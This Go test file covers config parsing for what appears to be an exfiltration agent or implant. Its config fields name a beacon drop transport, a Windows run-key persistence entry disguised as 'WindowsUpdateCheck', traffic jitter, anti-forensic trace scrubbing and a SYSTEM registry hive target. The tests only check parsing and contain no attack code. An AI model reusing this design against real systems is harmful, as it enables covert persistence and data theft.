package agent

import (
	"encoding/base64"
	"encoding/json"
	"testing"
)

func TestParseEmbeddedConfigRoundTrip(t *testing.T) {
	cfg := validTestConfig()
	cfg.Transport = TransportConfig{
		Mode:       "drop",
		SleepMode:  "timer",
		JitterSeed: "0011223344556677",
		Drop: DropConfig{
			Store:   "http",
			BaseURL: "https://drop.example.test",
			Dir:     "beacons",
		},
	}
	cfg.Persistence = PersistenceConfig{Mode: "watchdog", RunKeyName: "WindowsUpdateCheck"}
	cfg.Spool = SpoolConfig{Enabled: true, Dir: "/var/tmp/adverse-spool"}
	cfg.Shaping = ShapingConfig{Enabled: true, UploadJitterMs: 250}
	cfg.AntiForensic = AntiForensicConfig{ScrubTraces: true}
	cfg.ExitAfterDelivery = true
	cfg.RealMode = true
	raw, err := json.Marshal(cfg)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	got, err := ParseEmbeddedConfig(base64.StdEncoding.EncodeToString(raw))
	if err != nil {
		t.Fatalf("ParseEmbeddedConfig: %v", err)
	}
	if got.AgentID != cfg.AgentID || got.Secret != cfg.Secret || got.ServerURL != cfg.ServerURL {
		t.Errorf("core fields mismatch: %+v", got)
	}
	if got.SignPubHex != cfg.SignPubHex {
		t.Errorf("sign_pub_hex mismatch: %q != %q", got.SignPubHex, cfg.SignPubHex)
	}
	if got.ChunkSize != cfg.ChunkSize || got.MinDelayMs != cfg.MinDelayMs || got.MaxDelayMs != cfg.MaxDelayMs {
		t.Errorf("numeric fields mismatch: %+v", got)
	}
	if len(got.Hives) != 1 || got.Hives[0] != "SYSTEM" {
		t.Errorf("hives mismatch: %v", got.Hives)
	}
	if got.RealMode != cfg.RealMode {
		t.Errorf("real_mode mismatch: %v != %v", got.RealMode, cfg.RealMode)
	}
	if got.Transport.Mode != "drop" || got.Transport.Drop.BaseURL != "https://drop.example.test" ||
		got.Transport.SleepMode != "timer" || got.Transport.JitterSeed != "0011223344556677" {
		t.Errorf("transport mismatch: %+v", got.Transport)
	}
	if got.Persistence != cfg.Persistence {
		t.Errorf("persistence mismatch: %+v != %+v", got.Persistence, cfg.Persistence)
	}
	if got.Spool != cfg.Spool {
		t.Errorf("spool mismatch: %+v != %+v", got.Spool, cfg.Spool)
	}
	if got.Shaping != cfg.Shaping {
		t.Errorf("shaping mismatch: %+v != %+v", got.Shaping, cfg.Shaping)
	}
	if got.AntiForensic != cfg.AntiForensic {
		t.Errorf("anti_forensic mismatch: %+v != %+v", got.AntiForensic, cfg.AntiForensic)
	}
	if got.ExitAfterDelivery != cfg.ExitAfterDelivery {
		t.Errorf("exit_after_delivery mismatch: %v != %v", got.ExitAfterDelivery, cfg.ExitAfterDelivery)
	}
}

func TestParseEmbeddedConfigInvalidBase64(t *testing.T) {
	if _, err := ParseEmbeddedConfig("!!!not-base64!!!"); err == nil {
		t.Fatal("expected error for invalid base64")
	}
}

func TestParseEmbeddedConfigInvalidJSON(t *testing.T) {
	b64 := base64.StdEncoding.EncodeToString([]byte("{not json"))
	if _, err := ParseEmbeddedConfig(b64); err == nil {
		t.Fatal("expected error for invalid JSON")
	}
}

func TestParseEmbeddedConfigEmpty(t *testing.T) {
	if _, err := ParseEmbeddedConfig(""); err == nil {
		t.Fatal("expected error for empty input")
	}
}

func TestParseEmbeddedConfigSkipsValidate(t *testing.T) {
	cfg := validTestConfig()
	cfg.AgentID = "not-hex!" // would fail Validate
	raw, err := json.Marshal(cfg)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	got, err := ParseEmbeddedConfig(base64.StdEncoding.EncodeToString(raw))
	if err != nil {
		t.Fatalf("ParseEmbeddedConfig must not validate: %v", err)
	}
	if got.AgentID != "not-hex!" {
		t.Errorf("agent_id mismatch: %q", got.AgentID)
	}
	if err := got.Validate(); err == nil {
		t.Error("expected Validate to reject the invalid agent_id")
	}
}

func TestEmbeddedConfigEmpty(t *testing.T) {
	orig := embeddedConfigB64
	embeddedConfigB64 = ""
	defer func() { embeddedConfigB64 = orig }()

	cfg, err := EmbeddedConfig()
	if err != nil {
		t.Fatalf("EmbeddedConfig: %v", err)
	}
	if cfg != nil {
		t.Fatalf("expected nil config for lab build, got %+v", cfg)
	}
}

func TestEmbeddedConfigInjected(t *testing.T) {
	orig := embeddedConfigB64
	defer func() { embeddedConfigB64 = orig }()

	want := validTestConfig()
	raw, err := json.Marshal(want)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	embeddedConfigB64 = base64.StdEncoding.EncodeToString(raw)

	got, err := EmbeddedConfig()
	if err != nil {
		t.Fatalf("EmbeddedConfig: %v", err)
	}
	if got == nil || got.AgentID != want.AgentID {
		t.Fatalf("embedded config mismatch: %+v", got)
	}
}

func TestEmbeddedConfigCorrupt(t *testing.T) {
	orig := embeddedConfigB64
	defer func() { embeddedConfigB64 = orig }()

	embeddedConfigB64 = "%%%not-base64%%%"
	if _, err := EmbeddedConfig(); err == nil {
		t.Fatal("expected error for corrupt injected config")
	}
}
